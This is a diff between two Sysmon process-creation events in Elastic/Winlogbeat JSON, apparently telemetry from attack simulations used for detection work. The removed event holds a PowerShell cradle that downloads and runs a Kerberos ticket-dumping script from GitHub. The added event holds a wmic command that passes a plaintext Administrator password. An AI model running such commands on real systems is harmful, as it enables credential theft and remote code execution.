@@ -1,6 +1,6 @@
 {
   "@timestamp": [
-    "2025-09-09T14:54:49.269Z"
+    "2025-09-09T17:39:07.610Z"
   ],
   "agent.ephemeral_id": [
     "4aef2c92-921b-4e2e-93d9-8202e873e700"
@@ -33,10 +33,10 @@
     "1"
   ],
   "event.created": [
-    "2025-09-09T14:54:50.860Z"
+    "2025-09-09T17:39:08.631Z"
   ],
   "event.ingested": [
-    "2025-09-09T14:54:50.049Z"
+    "2025-09-09T17:39:34.415Z"
   ],
   "event.kind": [
     "event"
@@ -99,65 +99,106 @@
     "information"
   ],
   "message": [
-    "Process Create:\nRuleName: -\nUtcTime: 2025-09-09 14:54:49.269\nProcessGuid: {9602231E-3FB9-68C0-E501-000000003300}\nProcessId: 1256\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nFileVersion: 10.0.19041.3996 (WinBuild.160101.0800)\nDescription: Windows PowerShell\nProduct: Microsoft® Windows® Operating System\nCompany: Microsoft Corporation\nOriginalFileName: PowerShell.EXE\nCommandLine: \"powershell.exe\" & {Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/MzHmO/PowershellKerberos/beed52acda37fc531ef0cb4df3fc2eb63a74bbb8/dumper.ps1')}\nCurrentDirectory: C:\\Users\\KHAIRE~1\\AppData\\Local\\Temp\\\nUser: WINDOWS10\\khaireddine\nLogonGuid: {9602231E-2FD1-68C0-642E-020000000000}\nLogonId: 0x22e64\nTerminalSessionId: 1\nIntegrityLevel: High\nHashes: SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6\nParentProcessGuid: {00000000-0000-0000-0000-000000000000}\nParentProcessId: 5872\nParentImage: -\nParentCommandLine: -\nParentUser: -"
+    "Process Create:\nRuleName: -\nUtcTime: 2025-09-09 17:39:07.610\nProcessGuid: {9602231E-663B-68C0-1603-000000003300}\nProcessId: 6916\nImage: C:\\Windows\\System32\\wbem\\WMIC.exe\nFileVersion: 10.0.19041.5794 (WinBuild.160101.0800)\nDescription: WMI Commandline Utility\nProduct: Microsoft® Windows® Operating System\nCompany: Microsoft Corporation\nOriginalFileName: wmic.exe\nCommandLine: wmic  /user:DOMAIN\\Administrator /password:P@ssw0rd1 /node:\"127.0.0.1\" process where name='notepad.exe' delete \nCurrentDirectory: C:\\Users\\KHAIRE~1\\AppData\\Local\\Temp\\\nUser: WINDOWS10\\khaireddine\nLogonGuid: {9602231E-2FD1-68C0-642E-020000000000}\nLogonId: 0x22e64\nTerminalSessionId: 1\nIntegrityLevel: High\nHashes: SHA256=DA603FA720AB43AA6D4D36AA9FDB828DAB9645523EABAAC209AF6451D5B4D757,IMPHASH=527C7C66CDD13D72D793BCA3A417BCBE\nParentProcessGuid: {9602231E-663B-68C0-1403-000000003300}\nParentProcessId: 5660\nParentImage: C:\\Windows\\System32\\cmd.exe\nParentCommandLine: \"cmd.exe\" /c wmic /user:DOMAIN\\Administrator /password:P@ssw0rd1 /node:\"127.0.0.1\" process where name='notepad.exe' delete >nul 2>&1\nParentUser: WINDOWS10\\khaireddine"
   ],
   "process.args": [
-    "powershell.exe",
-    "&",
-    "{Invoke-Expression",
-    "(New-Object",
-    "Net.WebClient).DownloadString('https://raw.githubusercontent.com/MzHmO/PowershellKerberos/beed52acda37fc531ef0cb4df3fc2eb63a74bbb8/dumper.ps1')}"
+    "wmic",
+    "/user:DOMAIN\\Administrator",
+    "/password:P@ssw0rd1",
+    "/node:127.0.0.1",
+    "process",
+    "where",
+    "name='notepad.exe'",
+    "delete"
   ],
   "process.args_count": [
-    5
+    8
   ],
   "process.command_line": [
-    "\"powershell.exe\" & {Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/MzHmO/PowershellKerberos/beed52acda37fc531ef0cb4df3fc2eb63a74bbb8/dumper.ps1')}"
+    "wmic  /user:DOMAIN\\Administrator /password:P@ssw0rd1 /node:\"127.0.0.1\" process where name='notepad.exe' delete "
   ],
   "process.command_line.text": [
-    "\"powershell.exe\" & {Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/MzHmO/PowershellKerberos/beed52acda37fc531ef0cb4df3fc2eb63a74bbb8/dumper.ps1')}"
+    "wmic  /user:DOMAIN\\Administrator /password:P@ssw0rd1 /node:\"127.0.0.1\" process where name='notepad.exe' delete "
   ],
   "process.entity_id": [
-    "{9602231E-3FB9-68C0-E501-000000003300}"
+    "{9602231E-663B-68C0-1603-000000003300}"
   ],
   "process.executable": [
-    "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+    "C:\\Windows\\System32\\wbem\\WMIC.exe"
   ],
   "process.executable.text": [
-    "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+    "C:\\Windows\\System32\\wbem\\WMIC.exe"
   ],
   "process.hash.sha256": [
-    "9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3"
+    "da603fa720ab43aa6d4d36aa9fdb828dab9645523eabaac209af6451d5b4d757"
   ],
   "process.name": [
-    "powershell.exe"
+    "WMIC.exe"
   ],
   "process.name.text": [
-    "powershell.exe"
+    "WMIC.exe"
+  ],
+  "process.parent.args": [
+    "cmd.exe",
+    "/c",
+    "wmic",
+    "/user:DOMAIN\\Administrator",
+    "/password:P@ssw0rd1",
+    "/node:127.0.0.1",
+    "process",
+    "where",
+    "name='notepad.exe'",
+    "delete",
+    ">nul",
+    "2>&1"
+  ],
+  "process.parent.args_count": [
+    12
+  ],
+  "process.parent.command_line": [
+    "\"cmd.exe\" /c wmic /user:DOMAIN\\Administrator /password:P@ssw0rd1 /node:\"127.0.0.1\" process where name='notepad.exe' delete >nul 2>&1"
+  ],
+  "process.parent.command_line.text": [
+    "\"cmd.exe\" /c wmic /user:DOMAIN\\Administrator /password:P@ssw0rd1 /node:\"127.0.0.1\" process where name='notepad.exe' delete >nul 2>&1"
+  ],
+  "process.parent.entity_id": [
+    "{9602231E-663B-68C0-1403-000000003300}"
+  ],
+  "process.parent.executable": [
+    "C:\\Windows\\System32\\cmd.exe"
+  ],
+  "process.parent.executable.text": [
+    "C:\\Windows\\System32\\cmd.exe"
+  ],
+  "process.parent.name": [
+    "cmd.exe"
+  ],
+  "process.parent.name.text": [
+    "cmd.exe"
   ],
   "process.parent.pid": [
-    5872
+    5660
   ],
   "process.pe.company": [
     "Microsoft Corporation"
   ],
   "process.pe.description": [
-    "Windows PowerShell"
+    "WMI Commandline Utility"
   ],
   "process.pe.file_version": [
-    "10.0.19041.3996 (WinBuild.160101.0800)"
+    "10.0.19041.5794 (WinBuild.160101.0800)"
   ],
   "process.pe.imphash": [
-    "3d08f4848535206d772de145804ff4b6"
+    "527c7c66cdd13d72d793bca3a417bcbe"
   ],
   "process.pe.original_file_name": [
-    "PowerShell.EXE"
+    "wmic.exe"
   ],
   "process.pe.product": [
     "Microsoft® Windows® Operating System"
   ],
   "process.pid": [
-    1256
+    6916
   ],
   "process.working_directory": [
     "C:\\Users\\KHAIRE~1\\AppData\\Local\\Temp\\"
@@ -166,8 +207,8 @@
     "C:\\Users\\KHAIRE~1\\AppData\\Local\\Temp\\"
   ],
   "related.hash": [
-    "9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3",
-    "3d08f4848535206d772de145804ff4b6"
+    "da603fa720ab43aa6d4d36aa9fdb828dab9645523eabaac209af6451d5b4d757",
+    "527c7c66cdd13d72d793bca3a417bcbe"
   ],
   "related.user": [
     "khaireddine"
@@ -194,10 +235,10 @@
     "Microsoft Corporation"
   ],
   "winlog.event_data.Description": [
-    "Windows PowerShell"
+    "WMI Commandline Utility"
   ],
   "winlog.event_data.FileVersion": [
-    "10.0.19041.3996 (WinBuild.160101.0800)"
+    "10.0.19041.5794 (WinBuild.160101.0800)"
   ],
   "winlog.event_data.IntegrityLevel": [
     "High"
@@ -207,6 +248,9 @@
   ],
   "winlog.event_data.LogonId": [
     "0x22e64"
+  ],
+  "winlog.event_data.ParentUser": [
+    "WINDOWS10\\khaireddine"
   ],
   "winlog.event_data.Product": [
     "Microsoft® Windows® Operating System"
@@ -233,7 +277,7 @@
     "Microsoft-Windows-Sysmon"
   ],
   "winlog.record_id": [
-    "466098"
+    "484027"
   ],
   "winlog.task": [
     "Process Create (rule: ProcessCreate)"
@@ -253,7 +297,7 @@
   "winlog.version": [
     5
   ],
-  "_id": "usT4LpkBoSoxSr8z7krX",
+  "_id": "p8SPL5kBoSoxSr8zwajP",
   "_index": ".ds-winlogbeat-9.1.2-2025.08.17-000001",
   "_score": null
 }
